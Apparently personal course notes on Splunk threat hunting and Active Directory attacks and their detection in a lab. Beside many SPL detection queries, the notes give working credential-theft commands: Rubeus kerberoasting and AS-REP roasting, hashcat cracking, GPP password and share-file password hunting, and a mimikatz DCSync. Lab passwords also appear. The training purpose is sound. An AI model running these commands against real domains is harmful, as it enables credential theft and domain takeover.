<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | rex field=Image "(?P&lt;filename&gt;[^\\\]+)$" | eval filename=lower(filename) | lookup malware_lookup.csv filename OUTPUTNEW is_malware | table filename, is_malware</code></p>
<p>The lookup command enriches the data with external sources.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | eval filename=mvdedup(split(Image, "\\")) | eval filename=mvindex(filename, -1) | eval filename=lower(filename) | lookup malware_lookup.csv filename OUTPUTNEW is_malware | table filename, is_malware | dedup filename, is_malware</code></p>
<p><code>| inputlookup malware_lookup.csv</code></p>
<p>The inputlookup command retrieves data from a lookup file without joining it to the search results.</p>
<p><code>index="main" earliest=-7d EventCode!=1</code></p>
<p>Every event in Splunk has a timestamp. Using the time range picker or the earliest and latest commands, you can limit searches to specific time periods.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" (EventCode=1 OR EventCode=3) | transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m | table Image |  dedup Image</code></p>
<p>The transaction command is used in Splunk to group events that share common characteristics into transactions, often used to track sessions or user activities that span across multiple events.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 NOT [ search index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | top limit=100 Image | fields Image ] | table _time, Image, CommandLine, User, ComputerName</code></p>
<p>A subsearch in Splunk is a search that is nested inside another search. It's used to compute a set of results that are then used in the outer search.</p>
<h4 id="spl">SPL</h4>
<p><code>| eventcount summarize=false index=* | table index</code></p>
<p>This query uses eventcount to count events in all indexes, then summarize=false is used to display counts for each index separately, and finally, the table command is used to present the data in tabular form.</p>
<p><code>| metadata type=sourcetypes</code></p>
<p>This search uses the metadata command, which provides us with various statistics about specified indexed fields. Here, we're focusing on sourcetypes. The result is a list of all sourcetypes in our Splunk environment, along with additional metadata such as the first time a source type was seen (firstTime), the last time it was seen (lastTime), and the number of hosts (totalCount).</p>
<p>For a simpler view, we can use the following search.</p>
<p><code>| metadata type=sourcetypes index=* | table sourcetype</code></p>
<p><code>| metadata type=sources index=* | table source</code></p>
<p>This command returns a list of all data sources in the Splunk environment.</p>
<p><code>sourcetype="WinEventLog:Security" | table _raw</code></p>
<p><code>sourcetype="WinEventLog:Security" | table *</code></p>
<p>The use of table * can result in a very wide table if our events have a large number of fields.</p>
<p><code>sourcetype="WinEventLog:Security" | fields Account_Name, EventCode | table Account_Name, EventCode</code></p>
<p><code>sourcetype="WinEventLog:Security" | fieldsummary</code></p>
<p>The values provided by the fieldsummary command are calculated based on the events returned by our search.</p>
<p><code>index=* sourcetype=* | bucket _time span=1d | stats count by _time, index, sourcetype | sort - _time</code></p>
<p>bucket command is used to group the events based on the _time field into 1-day buckets.</p>
<p><code>index=* sourcetype=* | rare limit=10 index, sourcetype</code></p>
<p>The rare command can help us identify uncommon event types, which might be indicative of abnormal behavior. </p>
<p><code>index="main" | rare limit=20 useother=f ParentImage</code></p>
<p>This command displays the 20 least common values of the ParentImage field.</p>
<p><code>index=* sourcetype=* | fieldsummary | where count &lt; 100 | table field, count, distinct_count</code></p>
<p>This search shows a summary of all fields (fieldsummary), filters out fields that appear in less than 100 events (where count &lt; 100), and then displays a table (table) showing the field name, total count, and distinct count.</p>
<p><code>index=* | sistats count by index, sourcetype, source, host</code></p>
<h4 id="introduction-to-splunk-spl">Introduction To Splunk &amp; SPL</h4>
<p><strong>Q1:</strong></p>
<p><code>sourcetype="WinEventLog:Security" EventCode=4768 | sistats count by Account_Name</code></p>
<p>The event code for a Kerberos authentication ticket request is 4768</p>
<p><img alt="alt text" src="../assets/image4.png" /></p>
<p><strong>Q2:</strong></p>
<p><code>sourcetype="WinEventLog:Security" EventCode=4624 Account_Name=SYSTEM | sistats count by ComputerName</code></p>
<p><img alt="alt text" src="../assets/image5.png" /></p>
<p><strong>Q3:</strong></p>
<p><code>sourcetype="WinEventLog:Security" EventCode=4624 | stats earliest(_time) as first_login latest(_time) as last_login count as total_attempts by Account_Name | eval duration = last_login - first_login | where duration &lt;= 600 | sort - total_attempts | head 1 | fields Account_Name, total_attempts, duration</code></p>
<p><img alt="alt text" src="../assets/image6.png" /></p>
<h4 id="using-splunk-applications">Using Splunk Applications</h4>
<p><strong>Q2:</strong></p>
<p><code>index=* sourcetype="wineventlog:sysmon" EventCode=3 Image="*SharpHound.exe" | stats count</code></p>
<h4 id="intrusion-detection-with-splunk-real-world-scenario">Intrusion Detection With Splunk (Real-world Scenario)</h4>
<pre><code>index=&quot;main&quot; earliest=0

index=&quot;main&quot; | stats count by sourcetype

index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot;

index=&quot;main&quot; uniwaldo.local

index=&quot;main&quot; *uniwaldo.local*

index=&quot;main&quot; ComputerName=&quot;*uniwaldo.local&quot;

index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; | stats count by EventCode
</code></pre>
<p><strong>Sysmon Event ID 1</strong> - Process Creation: Useful for hunts targeting abnormal parent-child process hierarchies, as illustrated in the first lesson with Process Hacker. It's an event we can use later.</p>
<p><strong>Sysmon Event ID 2</strong> - A process changed a file creation time: Helpful in spotting "time stomp" attacks, where attackers alter file creation times. Bear in mind, not all such actions signal malicious intent.</p>
<p><strong>Sysmon Event ID 3</strong> - Network connection: A source of abundant noise since machines are perpetually establishing network connections. We may uncover anomalies, but let's consider other quieter areas first.</p>
<p><strong>Sysmon Event ID 4</strong> - Sysmon service state changed: Could be a useful hunt if attackers attempt to stop Sysmon, though the majority of these events are likely benign and informational, considering Sysmon's frequent legitimate starts and stops.</p>
<p><strong>Sysmon Event ID 5</strong> - Process terminated: This might aid us in detecting when attackers kill key processes or use sacrificial ones. For instance, Cobalt Strike often spawns temporary processes like werfault, the termination of which would be logged here, as well as the creation in ID 1.</p>
<p><strong>Sysmon Event ID 6</strong> - Driver loaded: A potential flag for BYOD (bring your own driver) attacks, though this is less common. Before diving deep into this, let's weed out more conspicuous threats first.</p>
<p><strong>Sysmon Event ID 7</strong> - Image loaded: Allows us to track dll loads, which is handy in detecting DLL hijacks.</p>
<p><strong>Sysmon Event ID 8</strong> - CreateRemoteThread: Potentially aids in identifying injected threads. While remote threads can be created legitimately, if an attacker misuses this API, we can potentially trace their rogue process and what they injected into.</p>
<p><strong>Sysmon Event ID 10</strong> - ProcessAccess: Useful for spotting remote code injection and memory dumping, as it records when handles on processes are made.</p>
<p><strong>Sysmon Event ID 11</strong> - FileCreate: With many files being created frequently due to updates, downloads, etc., it might be challenging to aim our hunt directly here. However, these events can be beneficial in correlating or identifying a file's origins later.</p>
<p><strong>Sysmon Event ID 12</strong> - RegistryEvent (Object create and delete) &amp; <strong>Sysmon Event ID 13</strong> - RegistryEvent (Value Set): While numerous events take place here, many registry events can be malicious, and with a good idea of what to look for, hunting here can be fruitful.</p>
<p><strong>Sysmon Event ID 15</strong> - FileCreateStreamHash: Relates to file streams and the "Mark of the Web" pertaining to external downloads, but we'll leave this aside for now.</p>
<p><strong>Sysmon Event ID 16</strong> - Sysmon config state changed: Logs alterations in Sysmon configuration, useful for spotting tampering.</p>
<p><strong>Sysmon Event ID 17</strong> - Pipe created &amp; <strong>Sysmon Event ID 18</strong> - Pipe connected: Record pipe creations and connections. They can help observe malware's interprocess communication attempts, usage of PsExec, and SMB lateral movement.</p>
<p><strong>Sysmon Event ID 22</strong> - DNSEvent: Tracks DNS queries, which can be beneficial for monitoring beacon resolutions and DNS beacons.</p>
<p><strong>Sysmon Event ID 23</strong> - FileDelete: Monitors file deletions, which can provide insights into whether a threat actor cleaned up their malware, deleted crucial files, or possibly attempted a ransomware attack.</p>
<p><strong>Sysmon Event ID 25</strong> - ProcessTampering (Process image change): Alerts on behaviors such as process herpadering, acting as a mini AV alert filter.</p>
<pre><code>index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; EventCode=1 | stats count by ParentImage, Image

index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; EventCode=1 (Image=&quot;*cmd.exe&quot; OR Image=&quot;*powershell.exe&quot;) | stats count by ParentImage, Image

index=&quot;main&quot; sourcetype=&quot;WinEventLog:Sysmon&quot; EventCode=1 (Image=&quot;*cmd.exe&quot; OR Image=&quot;*powershell.exe&quot;) ParentImage=&quot;C:\\Windows\\System32\\notepad.exe&quot;

index=&quot;main&quot; 10.0.0.229 | stats count by sourcetype

index=&quot;main&quot; 10.0.0.229 sourcetype=&quot;linux:syslog&quot;

index=&quot;main&quot; 10.0.0.229 sourcetype=&quot;WinEventLog:sysmon&quot; | stats count by CommandLine

index=&quot;main&quot; 10.0.0.229 sourcetype=&quot;WinEventLog:sysmon&quot; | stats count by CommandLine, host

index=&quot;main&quot; EventCode=4662 Access_Mask=0x100 Account_Name!=*$

index=&quot;main&quot; EventCode=10 lsass | stats count by SourceImage

index=&quot;main&quot; EventCode=10 lsass SourceImage=&quot;C:\\Windows\\System32\\notepad.exe&quot;

index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; | stats count by EventCode

index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; | stats count by SourceImage

index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; | where SourceImage!=TargetImage | stats count by SourceImage

index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* | where SourceImage!=TargetImage | stats count by SourceImage

index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* | where SourceImage!=TargetImage | stats count by SourceImage

index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!=&quot;C:\\Windows\\Explorer.EXE&quot; | where SourceImage!=TargetImage | stats count by SourceImage

index=&quot;main&quot; CallTrace=&quot;*UNKNOWN*&quot; SourceImage!=&quot;*Microsoft.NET*&quot; CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!=&quot;C:\\Windows\\Explorer.EXE&quot; | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrace
</code></pre>
<p><strong>Q1:</strong></p>
<p><code>index="main" EventCode=10 lsass | stats count by SourceImage</code></p>
<p>rundll32.exe</p>
<p><strong>Q2:</strong></p>
<p><code>index="main" EventCode=10 lsass SourceImage="C:\\Windows\\System32\\rundll32.exe" | stats count by CallTrace</code></p>
<p><img alt="alt text" src="../assets/image7.png" /></p>
<p>comsvcs.dll</p>
<p><strong>Q3:</strong></p>
<p><code>index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*clr.dll* CallTrace!=*ni.dll* | where SourceImage!=TargetImage | stats count by SourceImage</code></p>
<p>rundll32.exe</p>
<p><strong>Q4:</strong></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 Image="C:\\Windows\\System32\\rundll32.exe" DestinationIp="*" | rex field=DestinationIp "10\\.0\\.0\\.(?&lt;octet&gt;\\d{1,3})" | search (octet&gt;=0 AND octet&lt;=99) OR (octet&gt;=100 AND octet&lt;=199) | stats values(DestinationIp) as destination_ips</code></p>
<p><img alt="alt text" src="../assets/image8.png" /></p>
<p>10.0.0.186 and 10.0.0.91</p>
<p><strong>Q5:</strong></p>
<p><code>index=main EventCode=3 (SourceIp="10.0.0.186" OR SourceIp="10.0.0.91") DestinationPort="*" | stats values(DestinationPort) as destination_ports</code></p>
<p><code>index=main EventCode=3 (SourceIp="10.0.0.186" OR SourceIp="10.0.0.91") | stats count by DestinationPort</code></p>
<h4 id="detecting-attacker-behavior-with-splunk-based-on-ttps">Detecting Attacker Behavior With Splunk Based On TTPs</h4>
<ol>
<li>Example: Detection Of Reconnaissance Activities Leveraging Native Windows Binaries</li>
</ol>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=*\\ipconfig.exe OR Image=*\\net.exe OR Image=*\\whoami.exe OR Image=*\\netstat.exe OR Image=*\\nbtstat.exe OR Image=*\\hostname.exe OR Image=*\\tasklist.exe | stats count by Image,CommandLine | sort - count</code></p>
<ol>
<li>Example: Detection Of Requesting Malicious Payloads/Tools Hosted On Reputable/Whitelisted Domains (Such As githubusercontent.com)</li>
</ol>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=22  QueryName="*github*" | stats count by Image, QueryName</code></p>
<ol>
<li>Example: Detection Of PsExec Usage</li>
</ol>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\\Windows\\system32\\services.exe" TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath" | rex field=Details "(?&lt;reg_file_name&gt;[^\\\]+)$" | eval reg_file_name = lower(reg_file_name), file_name = if(isnull(file_name),reg_file_name,lower(file_name)) | stats values(Image) AS Image, values(Details) AS RegistryDetails, values(_time) AS EventTimes, count by file_name, ComputerName</code></p>
<p><code>| rex field=Details "(?&lt;reg_file_name&gt;[^\\\]+)$"</code>: The rex command here is extracting the file name from the Details field using a regular expression. The pattern [^\]+)$ captures the part of the path after the last backslash, which is typically the file name. This value is stored in a new field reg_file_name.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System | stats count by TargetFilename</code></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System | stats count by PipeName</code></p>
<ol>
<li>Example: Detection Of Utilizing Archive Files For Transferring Tools Or Data Exfiltration</li>
</ol>
<p><code>index="main" EventCode=11 (TargetFilename="*.zip" OR TargetFilename="*.rar" OR TargetFilename="*.7z") | stats count by ComputerName, User, TargetFilename | sort - count</code></p>
<ol>
<li>Example: Detection Of Utilizing PowerShell or MS Edge For Downloading Payloads/Tools</li>
</ol>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*powershell.exe*" |  stats count by Image, TargetFilename |  sort + count</code></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*msedge.exe" TargetFilename=*"Zone.Identifier" |  stats count by TargetFilename |  sort + count</code></p>
<p>The <code>*Zone.Identifier</code> is indicative of a file downloaded from the internet or another potentially untrustworthy source. Windows uses this zone identifier to track the security zones of a file. The Zone.Identifier is an ADS (Alternate Data Stream) that contains metadata about where the file was downloaded from and its security settings.</p>
<ol>
<li>Example: Detection Of Execution From Atypical Or Suspicious Locations</li>
</ol>
<p><code>index="main" EventCode=1 | regex Image="C:\\\\Users\\\\.*\\\\Downloads\\\\.*" |  stats count by Image</code></p>
<ol>
<li>Example: Detection Of Executables or DLLs Being Created Outside The Windows Directory</li>
</ol>
<p><code>index="main" EventCode=11 (TargetFilename="*.exe" OR TargetFilename="*.dll") TargetFilename!="*\\windows\\*" | stats count by User, TargetFilename | sort + count</code></p>
<ol>
<li>Example: Detection Of Misspelling Legitimate Binaries</li>
</ol>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 (CommandLine="*psexe*.exe" NOT (CommandLine="*PSEXESVC.exe" OR CommandLine="*PsExec64.exe")) OR (ParentCommandLine="*psexe*.exe" NOT (ParentCommandLine="*PSEXESVC.exe" OR ParentCommandLine="*PsExec64.exe")) OR (ParentImage="*psexe*.exe" NOT (ParentImage="*PSEXESVC.exe" OR ParentImage="*PsExec64.exe")) OR (Image="*psexe*.exe" NOT (Image="*PSEXESVC.exe" OR Image="*PsExec64.exe")) |  table Image, CommandLine, ParentImage, ParentCommandLine</code></p>
<ol>
<li>Example: Detection Of Using Non-standard Ports For Communications/Transfers</li>
</ol>
<p><code>index="main" EventCode=3 NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21) | stats count by SourceIp, DestinationIp, DestinationPort | sort - count</code></p>
<h4 id="detecting-attacker-behavior-with-splunk-based-on-analytics">Detecting Attacker Behavior With Splunk Based On Analytics</h4>
<p>The <code>streamstats</code> command allows us to perform real-time analytics on the data, which can be useful for identifying unusual patterns or trends.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | bin _time span=1h | stats count as NetworkConnections by _time, Image | streamstats time_window=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image | eval isOutlier=if(NetworkConnections &gt; (avg + (0.5*stdev)), 1, 0) | search isOutlier=1</code></p>
<ol>
<li>Example: Detection Of Abnormally Long Commands</li>
</ol>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe | eval len=len(CommandLine) | table User, len, CommandLine | sort - len</code></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe ParentImage!="*msiexec.exe" ParentImage!="*explorer.exe" | eval len=len(CommandLine) | table User, len, CommandLine | sort - len</code></p>
<ol>
<li>Example: Detection Of Abnormal cmd.exe Activity</li>
</ol>
<p><code>index="main" EventCode=1 (CommandLine="*cmd.exe*") | bucket _time span=1h | stats count as cmdCount by _time User CommandLine | eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev | eval isOutlier=if(cmdCount &gt; avg+1.5*stdev, 1, 0) | search isOutlier=1</code></p>
<ol>
<li>Example: Detection Of Processes Loading A High Number Of DLLs In A Specific Time</li>
</ol>
<p><code>index="main" EventCode=7 | bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded</code></p>
<p><code>index="main" EventCode=7 NOT (Image="C:\\Windows\\System32*") NOT (Image="C:\\Program Files (x86)*") NOT (Image="C:\\Program Files*") NOT (Image="C:\\ProgramData*") NOT (Image="C:\\Users\\waldo\\AppData*")| bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded | sort - unique_dlls_loaded</code></p>
<ol>
<li>Example: Detection Of Transactions Where The Same Process Has Been Created More Than Once On The Same Computer</li>
</ol>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | transaction ComputerName, Image | where mvcount(ProcessGuid) &gt; 1 | stats count by Image, ParentImage</code></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=1  | transaction ComputerName, Image  | where mvcount(ProcessGuid) &gt; 1 | search Image="C:\\Windows\\System32\\rundll32.exe" ParentImage="C:\\Windows\\System32\\svchost.exe" | table CommandLine, ParentCommandLine</code></p>
<p><strong>Q1:</strong></p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=8 
| bin _time span=1h 
| stats count as thread_injections by _time, SourceImage 
| eventstats avg(thread_injections) as avg_injections, stdev(thread_injections) as stdev_injections 
| eval upper_limit = avg_injections + (2 * stdev_injections) 
| where thread_injections &gt; upper_limit 
| table _time, SourceImage, thread_injections, avg_injections, stdev_injections, upper_limit 
| sort -thread_injections</code></p>
<p>Sysmon Event ID 8 - CreateRemoteThread: Potentially aids in identifying injected threads.</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=8 | bin _time span=1h 
|  stats count as thread_injections by _time, SourceImage</code></p>
<p><img alt="alt text" src="../assets/image9.png" /></p>
<h4 id="skills-assessment">Skills Assessment</h4>
<p><strong>Q1:</strong> Navigate to http://[Target IP]:8000, open the "Search &amp; Reporting" application, and find through SPL searches against all data the process that created remote threads in rundll32.exe. Answer format: _.exe</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=8 TargetImage="*rundll32.exe*" | stats count by SourceImage</code></p>
<p>randomfile.exe</p>
<p><strong>Q2:</strong> Navigate to http://[Target IP]:8000, open the "Search &amp; Reporting" application, and find through SPL searches against all data the process that started the infection. Answer format: _.exe</p>
<p><code>index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 | search "*randomfile.exe*" | stats count by TargetFilename Image</code></p>
<p>Found <code>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</code> download <code>randomfile.exe</code> and file creation time is <code>11/06/2022 10:08:46 AM</code></p>
<p>rundll32.exe</p>
<h2 id="windows-attacks-defense">Windows Attacks &amp; Defense</h2>
<p><strong>Lab Environment</strong></p>
<p>The attacks will be executed from the provided Windows 10 (WS001) and Kali Linux machines. The assumption is that an attacker has already gained remote code execution (of some sort) on that Windows 10 (WS001) machine. The user, which we assume is compromised, is Bob, a regular user in Active Directory with no special permissions assigned.</p>
<p>The environment consists of the following machines and their corresponding IP addresses:</p>
<p>DC1: 172.16.18.3</p>
<p>DC2: 172.16.18.4</p>
<p>Server01: 172.16.18.10</p>
<p>PKI: 172.16.18.15</p>
<p>WS001: DHCP or 172.16.18.25 (depending on the section)</p>
<p>Kali Linux: DHCP or 172.16.18.20 (depending on the section)</p>
<p><strong>Connect to WS001 via RDP</strong></p>
<p><code>xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution</code></p>
<p><strong>Connect to Kali via SSH</strong></p>
<p><code>$ ssh kali@TARGET_IP</code> </p>
<p>Password is kali</p>
<p>We have also enabled RDP on the Kali host. For sections with the Kali host as the primary target, it is recommended to connect with RDP. </p>
<p><code>xfreerdp /v:TARGET_IP /u:kali /p:kali /dynamic-resolution</code></p>
<p><strong>Moving files between WS001 and your Linux attacking machine</strong></p>
<p>To facilitate easy file transfer between the machines, we have created a shared folder on WS001, which can be accessed via SMB.</p>
<p><code>$ smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123</code></p>
<h4 id="kerberoasting">Kerberoasting</h4>
<pre><code class="language-bash">.\Rubeus.exe kerberoast /outfile:spn.txt
</code></pre>
<p><strong>Q2:</strong></p>
<p>Remote Desktop Connection -&gt; Event viewer -&gt; Windows Logs -&gt; Security -&gt; Filter Current Log (Last Hour) -&gt; Event ID 4769 (A Kerberos service ticket was requested) -&gt; Find "webservice"</p>
<p><img alt="alt text" src="../assets/image10.png" /></p>
<h4 id="as-reproasting">AS-REProasting</h4>
<p>The success of this attack depends on the strength of the password of users with Do not require Kerberos preauthentication configured.</p>
<p><code>.\Rubeus.exe asreproast /outfile:asrep.txt</code></p>
<p>For hashcat to be able to recognize the hash, we need to edit it by adding <code>23$</code> after <code>$krb5asrep$</code></p>
<p><code>$krb5asrep$23$anni@eagle.local:</code></p>
<p><code>sudo hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --outfile asrepcrack.txt --force</code></p>
<p><strong>Event ID 4768(S, F):</strong> A Kerberos authentication ticket (TGT) was requested.</p>
<h4 id="gpp-passwords-group-policy-preferences">GPP Passwords (Group Policy Preferences)</h4>
<p>SYSVOL is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. AD stores all group policies in <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.</p>
<pre><code class="language-bash">powershell -ep bypass
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
</code></pre>
<p><strong>Prevention:</strong> For auditing, we can generate an event whenever a user reads the XML file containing the credentials.</p>
<p><strong>Event ID 4663:</strong>  An attempt was made to access an object.</p>
<h4 id="gpo-permissionsgpo-files">GPO Permissions/GPO Files</h4>
<p><strong>Prevention</strong></p>
<p>One way to prevent this attack is to lock down the GPO permissions to be modified by a particular group of users only or by a specific account, as this will significantly limit the ability of who can edit the GPO or change its permissions (as opposed to everybody in Domain admins, which in some organizations can easily be more than 50). Similarly, never deploy files stored in network locations so that many users can modify the share permissions.</p>
<p>We should also review the permissions of GPOs actively and regularly, with the option of automating a task that runs hourly and alerts if any deviations from the expected permissions are detected.</p>
<p><strong>Event ID 5136(S)</strong> A directory service object was modified.</p>
<ul>
<li>
<p>GPO is linked to non-critical servers only.</p>
</li>
<li>
<p>Continuous automation is in place for monitoring modifications of GPO. - - If the GPO file is modified, we will disable the user performing the modification immediately.</p>
</li>
<li>
<p>The GPO should be automatically unlinked from all locations if a modification is detected.</p>
</li>
</ul>
<pre><code class="language-powershell"># Define filter for the last 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Search for event ID 5136 (GPO modified) in the past 15 minutes
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match &quot;CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL&quot;}


if($Logs){
    $emailBody = &quot;Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n&quot;
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody = $emailBody + &quot;Disabled user &quot; + $log.Properties[3].Value + &quot;`r`n&quot;
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Send an alert via email - complete the command below
    # Send-MailMessage
    $emailBody
}
</code></pre>
<p><strong>Event ID 4725</strong> is a security event that is logged in Active Directory when a user or computer object is disabled.</p>
<h4 id="credentials-in-shares">Credentials in Shares</h4>
<pre><code class="language-powershell">powershell -ep bypass
Import-Module .\PowerView.ps1
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
</code></pre>
<p><img alt="alt text" src="../assets/image11.png" /></p>
<p><code>\\Server01.eagle.local\dev$</code></p>
<p><strong><code>findstr</code> command:</strong></p>
<p><code>/s</code> forces to search the current directory and all subdirectories</p>
<p><code>/i</code> ignores case in the search term</p>
<p><code>/m</code> shows <em>only</em> the filename for a file that matches the term. We highly need this in real production environments because of the huge amounts of text that get returned. For example, this can be thousands of lines in PowerShell scripts that contain the PassThru parameter when matching for the string pass.</p>
<p>The term that defines what we are looking for. Good candidates include pass, pw, and the NETBIOS name of the domain. In the playground environment, it is eagle. Attractive targets for this search would be file types such as .bat, .cmd, .ps1, .conf, .config, and .ini.</p>
<pre><code class="language-bash">cd \\Server01.eagle.local\dev$

# find password in files
findstr /m /s /i &quot;pass&quot; *.bat
findstr /m /s /i &quot;pass&quot; *.cmd
findstr /m /s /i &quot;pass&quot; *.ini
findstr /m /s /i &quot;pass&quot; *.config

findstr /m /s /i &quot;pw&quot; *.config
findstr /s /i &quot;pw&quot; *.config

findstr /m /s /i &quot;eagle&quot; *.ps1
findstr /s /i &quot;eagle&quot; *.ps1
</code></pre>
<p>Event IDs 4624/4625 (successful and failed logon) and 4768 (Kerberos TGT requested)</p>
<p><strong>Q1:</strong></p>
<p><code>findstr /s /i "Administrator2" *.ps1</code></p>
<h4 id="credentials-in-object-properties">Credentials in Object Properties</h4>
<pre><code class="language-powershell">Function SearchUserClearTextInformation
{
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += &quot;(`$_.Description -like `&quot;*$t*`&quot;)&quot;
        $list += &quot;(`$_.Info -like `&quot;*$t*`&quot;)&quot;
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
</code></pre>
<pre><code class="language-bash">Import-Module .\SearchUserClearTextInformation.ps1
SearchUserClearTextInformation -Terms &quot;pass&quot;
</code></pre>
<p><img alt="alt text" src="../assets/image12.png" /></p>
<p>DC1 (172.16.18.3)</p>
<p>Event ID 4771(F) Kerberos pre-authentication failed.</p>
<p>Event ID 4776(S, F): The computer attempted to validate the credentials for an account.</p>
<p><code>wmic useraccount where name='bonni' get name,sid</code></p>
<h4 id="dcsync">DCSync</h4>
<p>DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:</p>
<ul>
<li>
<p>Replicating Directory Changes</p>
</li>
<li>
<p>Replicating Directory Changes All</p>
</li>
</ul>
<pre><code>runas /user:eagle\rocky cmd.exe

C:\Mimikatz&gt;mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
</code></pre>
<p><strong>Prevention</strong></p>
<p>The only prevention technique against this attack is using solutions such as the <strong>RPC Firewall</strong>, a third-party product that can block or allow specific RPC calls with robust granularity. For example, using RPC Firewall, we can only allow replications from Domain Controllers.</p>
<p><strong>Event ID 4662(S, F)</strong> An operation was performed on an object.</p>
<h4 id="golden-ticket">Golden Ticket</h4>
<p>The Kerberos Golden Ticket is an attack in which threat agents can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.</p>
<p>To perform the Golden Ticket attack, we can use Mimikatz with the following arguments:</p>
<p><code>/domain</code>: The domain's name.</p>
<p><code>/sid</code>: The domain's SID value.</p>
<p><code>/rc4</code>: The password's hash of krbtgt.</p>
<p><code>/user</code>: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)</p>
<p><code>/id</code>: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.</p>
<p>Additionally, advanced threat agents mostly will specify values for the /renewmax and /endin arguments, as otherwise, Mimikatz will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by EDRs:</p>
